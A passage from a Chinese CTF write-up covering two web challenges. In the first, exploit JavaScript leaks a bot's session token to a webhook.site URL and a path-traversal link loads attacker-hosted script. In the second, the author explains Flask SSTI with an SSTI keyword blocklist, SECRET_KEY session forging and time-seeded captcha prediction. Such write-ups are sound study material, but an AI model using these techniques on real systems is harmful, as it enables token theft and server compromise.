<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span><span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> session <span class="token operator">=</span> req<span class="token punctuation">.</span>session
    <span class="token keyword">let</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>username
    <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">let</span> vip_url <span class="token operator">=</span> VIP_URL
    <span class="token keyword">let</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> vip_url<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>
            Cookie<span class="token punctuation">:</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>k<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>v<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        body<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> code <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'ok'</span> <span class="token operator">==</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> isVip<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Congratulation! You are VIP now.'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而这里是又出现了<code>new URL</code>这种错误处理方式，所以<code>username</code>搞成自己的<code>dnslog</code>就可以了。</p>
<p>这里有两种办法。一种是控制机器人去登录拿到<code>token</code>，另一种是在远程登录个账号，把浏览器的<code>token</code>复制过来用<code>fetch</code>直接带着<code>token</code>打<code>/vip</code>。</p>
<p>PS：憨批了本地调试的时候把<code>/vip</code>的<code>auth</code>关掉了操，我说怎么没<code>token</code>打不通。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'https://webhook.site/e58effa8-d9d9-48a0-98f2-22a962961c22'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">'9cbf71c9e88878f6db5cc6285a7a1de7'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
  headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>
    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  body<span class="token punctuation">:</span> data
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> vipData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    vipData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      method<span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      body<span class="token punctuation">:</span> vipData
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>response <span class="token operator">=</span><span class="token operator">></span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Success:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后访问就可以让<code>bot</code>访问<code>preview</code>路由来加载没有<code>CSP</code>限制的恶意<code>js</code>了。</p>
<pre><code>http://124.70.33.170:3000/share/..%2Fpreview%3Ftex%3D123%26theme%3Dhttp%3A%2F%2F114.xx.xx.xx
</code></pre>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682522021.jpg" alt="1698682522021"></p>
<h4 id="story"><a href="#story" class="headerlink" title="story"></a>story</h4><p>非常明显的<code>SSTI</code>。</p>
<pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/story'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">story</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    story <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> story <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> story <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>
        tpl <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'templates/story.html'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>tpl <span class="token operator">%</span> story<span class="token punctuation">)</span> 
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>      
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但是想要设置<code>story</code>首先要成为<code>vip</code>。</p>
<pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/write'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    
    story <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'story'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> 
    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'vip'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token keyword">if</span> <span class="token operator">not</span> minic_waf<span class="token punctuation">(</span>story<span class="token punctuation">)</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span>
            session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'no way~~~'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        
        session<span class="token punctuation">[</span><span class="token string">'story'</span><span class="token punctuation">]</span> <span class="token operator">=</span> story
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Please become a VIP first.'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>并且<code>/write</code>这里调用的竟然是随机<code>waf</code>，莫名感觉有点搞笑…甲方看了直落泪。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> random

rule <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true"># rule 1</span>
    <span class="token punctuation">[</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'set'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true"># rule 2</span>
    <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">,</span><span class="token string">'__'</span><span class="token punctuation">,</span><span class="token string">'list'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token comment" spellcheck="true"># rule 3</span>
    <span class="token punctuation">[</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">'doc'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 4</span>
    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 5</span>
    <span class="token punctuation">[</span><span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># rule 6</span>
<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># Make waf more random</span>
<span class="token keyword">def</span> <span class="token function">transfrom</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>
    b <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> number <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span>

<span class="token keyword">def</span> <span class="token function">singel_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> rules<span class="token punctuation">)</span><span class="token punctuation">:</span>
    input <span class="token operator">=</span> input<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> rule <span class="token keyword">in</span> rules<span class="token punctuation">:</span>
        <span class="token keyword">if</span> rule <span class="token keyword">in</span> input<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">minic_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">:</span>
    waf_seq <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>waf_seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> transfrom<span class="token punctuation">(</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> singel_waf<span class="token punctuation">(</span>input<span class="token punctuation">,</span> rule<span class="token punctuation">[</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里其实不需要去绕这么多黑名单，只要去绕<code>config</code>就行，因为<code>SECRET_KEY</code> 在<code>config</code>里面，直接去伪造<code>flask session</code>就可以<code>ssti</code> 了。但由于这个随机<code>WAF</code>，实际上你多请求几次，甚至连<code>config</code>都不用绕过。</p>
<h5 id="成为vip（验证码生成逻辑错误）"><a href="#成为vip（验证码生成逻辑错误）" class="headerlink" title="成为vip（验证码生成逻辑错误）"></a>成为vip（验证码生成逻辑错误）</h5><p>这个题的主要问题是如何成为<code>vip</code>。</p>
<p>仔细观察生成验证码的逻辑，首先访问<code>/captcha</code>会实例化<code>Captcha</code>类，随后调用了<code>generate()</code>方法生成第一个验证码。</p>
<p>这里值得注意的地方就是<code>random.seed</code>设置的种子是<code>(key or int(time.time())) + random.randint(1,100)</code>，即当前时间戳加上一个随机数，这就很容易爆破了（只要服务器时间是同步的）</p>
<p>我们知道<code>random</code>是伪随机的，这里自己写个脚本测试一下就知道，设置个固定的种子，然后调用<code>generate_code</code>若干次，运行多次脚本。尽管没发现周期性，但你会发现每一次运行脚本生成的随机数一定是一样的。</p>
<pre class="line-numbers language-python"><code class="language-python">ColorTuple <span class="token operator">=</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">]</span>

DATA_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">)</span>
DEFAULT_FONTS <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>DATA_DIR<span class="token punctuation">,</span> <span class="token string">'DroidSansMono.ttf'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">class</span> <span class="token class-name">Captcha</span><span class="token punctuation">:</span>
    lookup_table<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>int<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">1.97</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> int <span class="token operator">=</span> None<span class="token punctuation">,</span> length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span> 
                 fonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">,</span> font_sizes<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>_width <span class="token operator">=</span> width
        self<span class="token punctuation">.</span>_height <span class="token operator">=</span> height
        self<span class="token punctuation">.</span>_length <span class="token operator">=</span> length
        self<span class="token punctuation">.</span>_key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">or</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_fonts <span class="token operator">=</span> fonts <span class="token operator">or</span> DEFAULT_FONTS
        self<span class="token punctuation">.</span>_font_sizes <span class="token operator">=</span> font_sizes <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_key<span class="token punctuation">)</span>


    @property
    <span class="token keyword">def</span> <span class="token function">truefonts</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts
        self<span class="token punctuation">.</span>_truefonts <span class="token operator">=</span> <span class="token punctuation">[</span>
            truetype<span class="token punctuation">(</span>n<span class="token punctuation">,</span> s<span class="token punctuation">)</span>
            <span class="token keyword">for</span> n <span class="token keyword">in</span> self<span class="token punctuation">.</span>_fonts
            <span class="token keyword">for</span> s <span class="token keyword">in</span> self<span class="token punctuation">.</span>_font_sizes
        <span class="token punctuation">]</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts

    @staticmethod
    <span class="token keyword">def</span> <span class="token function">create_noise_curve</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>
        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size
        x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        x2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>w <span class="token operator">-</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>
        y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
